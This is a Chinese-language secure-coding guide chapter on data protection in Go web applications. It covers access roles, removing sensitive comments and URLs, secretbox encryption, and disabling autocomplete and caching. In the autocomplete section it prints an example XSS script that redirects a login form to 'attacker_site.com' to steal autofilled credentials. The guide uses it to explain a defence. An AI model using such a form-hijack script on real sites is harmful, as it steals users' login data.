数据保护
===============

如今，安全方便最重要的事情就是数据保护，你并不想要这样的东西：

![All your data are belong to us](files/cB52MA.jpeg)

简而言之，你需要保护你 Web 应用的数据。本章节我们会讨论一些不同的方式来保护数据。

你应该注意的第一件事情就是给每个用户创建和配置正确的权限，并严格限制他们，让使用他们真正需要的功能。

例如，考虑一个在线商店，具有以下角色：

* _销售人员_: 只能看目录
* _营销人员_: 可以看统计报表
* _开发人员_: 可以修改页面和程序的配置

另外，在系统配置(也称为webserver)中，你应该定义正确的权限。

在最重要的事情是为每个用户定义好权限角色

角色权限分离和访问控制的内容，你可以在[访问控制][1]的章节里面阅读。

## 移除敏感信息

临时文件和缓存文件里面如果包含有敏感信息，不用的时候应该马上删除。如果其中还是有一部分是需要使用的要么放在安全的地方或者把他们做加密存放。

### 注释

某些时候，开发人员会在源码里面留下一些_TODO LISTS_，但是在某些最坏的情况下，开发人员可能会把一些认证信息留下来。
```go
// Secret API endpoint - /api/mytoken?callback=myToken
fmt.Println("Just a random code")
```
在上面的例子中，开发人员留下了带有敏感信息的注释，当你的程序源码没有被妥善保存的时候，可能会被别有用心的人利用。

### URL

使用 HTTP GET 来传递敏感信息的时候会使 Web 应用变得脆弱，原有如下：

1. 如果不使用 HTTPS，数据会被中间人拦截，这就是所谓的中间人攻击。
2. 浏览器会保存用户的访问信息，如果 URL 中有会话 ID, PINS 或者 TOKENS 而且还没有过期时间的话，它们很容易就被别人利用。

```go
req, _ := http.NewRequest("GET", "http://mycompany.com/api/mytoken?api_key=000s3cr3t000", nil)
```

如果你的 Web 应用试图用`api_key`从第三方网站获取信息的时候，由于没有使用 HTTPS 而且还是通过 GET 的方式请求数据就导致你的`api_key`很有可能被监听你的网络的人窃取。

同样的，如果你的 Web 应有有下面这样的链接：

```
http://mycompany.com/api/mytoken?api_key=000s3cr3t000
```
它也会被存在浏览器的历史记录里面，也可能被窃取。

解决方案应该始终使用 HTTPS。另外，尝试使用 POST 方法来传递参数，如果可以的话使用一次性的会话 ID 或者令牌。

### 信息就是力量

你应该始终把线上环境的程序和系统文档删掉，其中的某些文档可能会揭露版本信息，或者一些可以用来攻击你的 Web 应用的方法(比如：README，修改日志等等)。

作为一名开发人员，你应该让你的用户可以删除那些不在使用的敏感信息。比如某个用户的账户下面有一张已经过期的信用卡，你的 Web 应用应该支持删除这张卡片。

记住，那些不再使用的信息都应该从程序里面删除。

#### 加密是关键

在你的 Web 应用里面每个高敏感的信息都应该加密。Go 里面使用的是[军事等级的加密方案][2]。更多信息参考[加密实践][3]章节。

如果说你想在其他地方实现你的代码，那么只需要把原来的代码编译成一个二进制文件就可以。但是目前还没有防止逆向工程的方法。

对于不同的开发人员，给予不同的访问权限才是最佳实践。

不要在客户端以明文或任何非加密的形式保存用户密码，数据库连接字符串(可以在[数据库安全][4]章节看怎样加密数据库连接字符串)或者其他敏感信息。

下面是 Go 中使用`golang.org/x/crypto/nacl/secretbox`包加密的示例：

```go
// Load your secret key from a safe place and reuse it across multiple
// Seal calls. (Obviously don't use this example key for anything
// real.) If you want to convert a passphrase to a key, use a suitable
// package like bcrypt or scrypt.
secretKeyBytes, err := hex.DecodeString("6368616e676520746869732070617373776f726420746f206120736563726574")
if err != nil {
    panic(err)
}

var secretKey [32]byte
copy(secretKey[:], secretKeyBytes)

// You must use a different nonce for each message you encrypt with the
// same key. Since the nonce here is 192 bits long, a random value
// provides a sufficiently small probability of repeats.
var nonce [24]byte
if _, err := io.ReadFull(rand.Reader, nonce[:]); err != nil {
    panic(err)
}

// This encrypts "hello world" and appends the result to the nonce.
encrypted := secretbox.Seal(nonce[:], []byte("hello world"), &nonce, &secretKey)

// When you decrypt, you must use the same nonce and key you used to
// encrypt the message. One way to achieve this is to store the nonce
// alongside the encrypted message. Above, we stored the nonce in the first
// 24 bytes of the encrypted text.
var decryptNonce [24]byte
copy(decryptNonce[:], encrypted[:24])
decrypted, ok := secretbox.Open([]byte{}, encrypted[24:], &decryptNonce, &secretKey)
if !ok {
    panic("decryption error")
}

fmt.Println(string(decrypted))
```

输出是:

```
hello world
```

## 把不需要的功能停用 

另外一个降低被攻击风险的方式是停用系统中哪些你不需要的功能或者服务。

### 自动填充

根据 [Mozilla documentation][1], 你可以通过下面的方式禁用自动填充：

```html
<form method="post" action="/form" autocomplete="off">
```

或者在某个特定的表单元素上：

```html
<input type="text" id="cc" name="cc" autocomplete="off">
```
这对于在登录表单上禁用自动填充的功能特别有用。想象一下当登录页面包含有 XSS 的内容时，如果攻击者创建了一下的代码：

```javascript
window.setTimeout(function() {
  document.forms[0].action = 'http://attacker_site.com';
  document.forms[0].submit();
}
), 10000);
```

他将会把自动填充的内容发送到`attacker_site.com`网站。

### 缓存

在一些包含敏感信息的页面应该禁用缓存，这个可以在返回头里面设置：

```go
w.Header().Set("Cache-Control", "no-cache, no-store")
w.Header().Set("Pragma", "no-cache")
```

`no-cache`告诉浏览器在使用缓存前先向服务器请求最新的数据，而不是告诉浏览器_不缓存_。

另一方面，`no-store`才是告诉浏览器_不要缓存_而且不要存请求或者响应数据的任何部分。

`Pragma`头是为了支持 HTTP/1.0

[1]: https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion
[2]: https://godoc.org/golang.org/x/crypto
[3]: /cryptographic-practices/README.md
[4]: /database-security/README.md
